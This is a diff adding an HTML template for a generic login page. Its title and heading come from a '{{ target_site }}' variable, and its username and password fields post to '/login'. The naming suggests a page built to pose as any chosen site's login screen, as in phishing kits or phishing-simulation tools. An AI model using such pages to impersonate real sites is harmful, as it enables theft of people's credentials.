@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>{{ target_site }} - Login</title>
+    <style>
+        body { font-family: Arial; margin: 40px auto; max-width: 400px; }
+        .form-group { margin-bottom: 15px; }
+        input { width: 100%; padding: 8px; margin: 5px 0; }
+        button { width: 100%; padding: 10px; background: #4285f4; color: white; border: none; }
+    </style>
+</head>
+<body>
+    <h2>{{ target_site }} Login</h2>
+    <form method="POST" action="/login">
+        <div class="form-group">
+            <label>Email/Username:</label>
+            <input type="text" name="username" required>
+        </div>
+        <div class="form-group">
+            <label>Password:</label>
+            <input type="password" name="password" required>
+        </div>
+        <button type="submit">Login</button>
+    </form>
+</body>
+</html> 
